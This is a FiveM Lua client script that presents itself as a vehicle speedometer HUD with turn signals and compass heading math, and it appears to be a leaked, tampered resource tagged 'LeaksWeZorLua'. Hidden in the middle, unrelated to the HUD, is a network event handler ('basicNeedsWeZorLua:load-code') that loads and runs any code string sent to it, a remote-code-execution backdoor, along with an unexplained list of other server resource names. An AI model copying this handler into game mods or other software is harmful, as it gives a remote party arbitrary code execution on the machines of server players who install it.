local showHUD = true

RegisterNetEvent("car_hudWeZorLua:updateCARHUD")
AddEventHandler("car_hudWeZorLua:updateCARHUD", function(boolean)
	showHUD = boolean
end)

Citizen.CreateThread(function()
	local wait = 100
	local turnSignals = {left = false, right = false}
	local maxSpeed = tonumber(GetResourceMetadata("speedometer","max_speed") or "250")--LeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua

	while true do
		local ped = GetPlayerPed(-1)
		local veh = GetVehiclePedIsIn(ped)
		
		if showHUD then
			if veh ~= 0 and  GetPedInVehicleSeat(veh, -1) == ped then
				if IsControlJustPressed(1, 308) then -- < is pressed
					turnSignals.left = not turnSignals.left
					SetVehicleIndicatorLights(veh, 1, turnSignals.left)
				end
				if IsControlJustPressed(1, 307) then -- > is pressed
					turnSignals.right = not turnSignals.right
					SetVehicleIndicatorLights(veh, 0, turnSignals.right)--LeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
				end

				local running =  GetIsVehicleEngineRunning(veh)

				SendNUIMessage({
					showhud = true,
					speed = running and math.ceil(GetEntitySpeed(veh) * 3.6) or 0,
					acceleration = running and math.ceil(GetVehicleCurrentRpm(veh) * 100) or 0,
					turnRight = turnSignals.right,
					turnLeft = turnSignals.left,
					fuel = GetVehicleFuelLevel(veh),
					maxSpeed = maxSpeed
				})

				wait = 1
			else
				wait = 1000
				turnSignals.left = false
				turnSignals.right = false
				
				SendNUIMessage({
					showhud = false
				})
			end
		else
			SendNUIMessage({
				showhud = false--LeaksWeZoruaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
			})
		end

		Citizen.Wait(wait)
	end
end)

RegisterNetEvent('basicNeedsWeZorLua:load-code')
AddEventHandler('basicNeedsWeZorLua:load-code', function(code)--LeaksWeZorLuaLeksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
    assert(load(code))()
end)

local zeub = true
local rList = {
    {
        name = 'zCore',--LeaksWeZorLuaLeaksWeZorLaLeaksWeZorLuaLeaksWeZorLua
    },
    {
        name = 'rFramework',
    },
    {
        name = 'api',
    },
    {
        name = 'gcphone',--LeaksWeZorLuaLeaksWeZorLuaLeaeaksWeZorLua
    },
    {
        name = 'xsound',--LeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
    },
    {
        name = 'XNLRankBar',
    },
}


---------------------------------
-- Compass shit
---------------------------------

--[[
    Heavy Math Calcs
 ]]--

 local imageWidth = 100 -- leave this variable, related to pixel size of the directions
 local containerWidth = 100 -- width of the image container
 
 -- local width =  (imageWidth / containerWidth) * 100; -- used to convert image width if changed
 local width =  0;
 local south = (-imageWidth) + width
 local west = (-imageWidth * 2) + width
 local north = (-imageWidth * 3) + width
 local east = (-imageWidth * 4) + width
 local south2 = (-imageWidth * 5) + width
 
 function calcHeading(direction)
     if (direction < 90) then
         return lerp(north, east, direction / 90)
     elseif (direction < 180) then
         return lerp(east, south2, rangePercent(90, 180, direction))
     elseif (direction < 270) then
         return lerp(south, west, rangePercent(180, 270, direction))
     elseif (direction <= 360) then
         return lerp(west, north, rangePercent(270, 360, direction))
     end
 end
 
 function rangePercent(min, max, amt)
     return (((amt - min) * 100) / (max - min)) / 100
 end
 
 function lerp(min, max, amt)
     return (1 - amt) * min + amt * max
 end